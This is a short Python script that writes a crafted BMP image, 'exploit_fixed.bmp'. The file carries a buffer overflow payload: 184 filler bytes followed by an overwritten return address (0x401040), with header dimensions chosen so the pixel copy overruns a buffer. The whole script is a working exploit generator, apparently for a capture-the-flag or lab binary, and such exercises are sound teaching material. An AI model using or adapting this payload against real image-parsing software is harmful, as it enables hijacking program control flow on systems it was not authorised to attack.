import struct

width = 1
height = 106

payload = b"E" * 184
payload += struct.pack("<I", 0x401040)

total_cpy_size = 3 * width * height
payload = payload.ljust(total_cpy_size, b"\x00")

bfType = b'BM'
bfOffBits = 14 + 40
bfSize = bfOffBits + len(payload)
bmp_file_header = struct.pack("<2sIHHI", bfType, bfSize, 0, 0, bfOffBits)

biSize = 40
bmp_info_header = struct.pack("<IIIHHIIIIII",
    biSize, width, height,
    1, 24, 0,
    len(payload), 0, 0, 0, 0
)

with open("exploit_fixed.bmp", "wb") as f:
    f.write(bmp_file_header + bmp_info_header + payload)

print(f"[+] Payload size: {len(payload)} bytes")
